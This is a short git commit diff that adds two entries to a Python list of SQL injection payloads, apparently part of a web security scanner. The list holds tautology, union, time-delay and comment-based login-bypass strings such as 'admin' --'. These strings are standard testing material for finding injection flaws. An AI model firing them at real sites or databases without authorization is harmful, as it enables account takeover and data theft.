3dcab90fef847fc3540b6ee93534991ec4a9d644
Mrx <143259711+akuajalah01@users.noreply.github.com>
2026-05-13 00:19:10 +0700

    Add new SQL injection payloads

--- core/payloads/sqli_payloads.py
+++ core/payloads/sqli_payloads.py
@@ -9,5 +9,7 @@ SQLI_PAYLOADS = [
     "1' AND 1=2-- -",
     "1' UNION SELECT NULL-- -",
     "' OR 1=1#",
-    "1' WAITFOR DELAY '00:00:05'--"
+    "1' WAITFOR DELAY '00:00:05'--",
+    "admin' --",
+    "1' OR '1'='1'/*"
 ]
